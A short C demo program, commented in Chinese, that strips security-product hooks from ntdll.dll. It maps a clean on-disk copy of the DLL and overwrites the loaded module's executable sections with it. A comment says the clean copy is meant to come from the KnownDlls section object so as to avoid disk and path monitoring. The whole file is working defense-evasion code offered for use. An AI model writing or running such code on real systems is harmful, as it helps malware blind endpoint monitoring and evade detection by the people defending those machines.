// ntdll 磁盘重映射去 hook demo：从 KnownDlls 段对象取干净 .text 覆盖被 hook 区
#include <windows.h>
#include <stdio.h>

int main(void) {
    HANDLE f = CreateFileA("\\\\.\\C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    // 走段对象（\KnownDlls\ntdll.dll）避免磁盘 ACL/路径监控；demo 用文件映射简化
    HANDLE m = CreateFileMappingA(f, NULL, SEC_IMAGE | PAGE_READONLY, 0, 0, NULL);
    if (!m) { printf("[-] 映射失败 %lu\n", GetLastError()); return 1; }
    LPVOID clean = MapViewOfFile(m, FILE_MAP_READ, 0, 0, 0);
    HMODULE hooked = GetModuleHandleA("ntdll.dll");
    // .text 段定位（PE 头解析简化：首节通常 .text）
    WORD arch = *(WORD*)((BYTE*)clean + 0x3C);
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)clean + arch);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    DWORD old;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            VirtualProtect((BYTE*)hooked + sec->VirtualAddress, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy((BYTE*)hooked + sec->VirtualAddress, (BYTE*)clean + sec->VirtualAddress, sec->Misc.VirtualSize);
            VirtualProtect((BYTE*)hooked + sec->VirtualAddress, sec->Misc.VirtualSize, old, &old);
            printf("[+] %.*s 段已恢复（%lu 字节）\n", 8, sec->Name, sec->Misc.VirtualSize);
        }
    }
    return 0;
}
